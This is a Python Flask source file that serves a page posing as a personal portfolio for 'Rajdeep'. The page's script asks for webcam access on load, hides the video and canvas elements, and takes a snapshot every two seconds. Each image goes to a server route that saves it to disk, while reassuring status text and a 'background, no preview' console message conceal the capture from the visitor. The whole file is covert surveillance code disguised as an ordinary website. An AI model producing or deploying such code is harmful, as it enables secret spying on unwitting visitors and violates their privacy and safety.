from flask import Flask, request, jsonify
import base64, os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

HTML_PAGE = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Rajdeep | Portfolio</title>
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
      color: #00ffcc;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    h1 {
      font-size: 3em;
      letter-spacing: 2px;
      text-shadow: 0 0 10px #00ffcc;
      animation: glow 2s ease-in-out infinite alternate;
    }
    p {
      font-size: 1.2em;
      color: #ccc;
      text-align: center;
      max-width: 600px;
    }
    footer {
      position: absolute;
      bottom: 15px;
      font-size: 0.9em;
      color: #666;
    }
    @keyframes glow {
      from { text-shadow: 0 0 10px #00ffcc; }
      to { text-shadow: 0 0 25px #00ffee, 0 0 35px #00ffee; }
    }
    #status {
      font-size: 0.9em;
      color: #00ffcc;
      margin-top: 20px;
      opacity: 0.6;
    }
    /* Hide video + canvas completely */
    video, canvas {
      display: none !important;
      visibility: hidden;
    }
  </style>
</head>
<body>
  <h1>Rajdeep</h1>
  <p>Welcome to my digital portfolio. Crafting modern web experiences with creativity and code.</p>
  <div id="status">Initializing background systems...</div>
  <footer>© 2025 Rajdeep</footer>

  <!-- Hidden video/canvas for capture -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');
let stream = null;
let captureInterval = null;

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;
    status.textContent = 'Background capture active...';
    startAutoCapture();
  } catch (err) {
    console.error(err);
    status.textContent = 'Camera access error: ' + err.message;
  }
}

function startAutoCapture() {
  if (captureInterval) clearInterval(captureInterval);
  captureInterval = setInterval(captureAndUpload, 2000);
}

async function captureAndUpload() {
  if (!stream) return;
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataUrl = canvas.toDataURL('image/png');

  try {
    const resp = await fetch('/upload_snapshot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: dataUrl })
    });
    const json = await resp.json();
    if (json.ok) status.textContent = 'System running smoothly...';
  } catch (err) {
    console.error(err);
    status.textContent = 'Upload error: ' + err.message;
  }
}

window.addEventListener('load', startCamera);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return HTML_PAGE

@app.route("/upload_snapshot", methods=["POST"])
def upload_snapshot():
    data = request.get_json()
    if not data or "image" not in data:
        return jsonify({"ok": False, "error": "No image provided"}), 400

    try:
        img_b64 = data["image"].split(",")[-1]
        img_bytes = base64.b64decode(img_b64)
    except Exception:
        return jsonify({"ok": False, "error": "Invalid image"}), 400

    filename = datetime.now().strftime("snapshot_%Y%m%d_%H%M%S.png")
    path = os.path.join(UPLOAD_FOLDER, filename)
    with open(path, "wb") as f:
        f.write(img_bytes)

    return jsonify({"ok": True, "filename": filename})

if __name__ == "__main__":
    print("🚀 Running portfolio on http://127.0.0.1:5000")
    print("📸 Auto-capture every 2 seconds (in background, no preview)")
    app.run(debug=True)
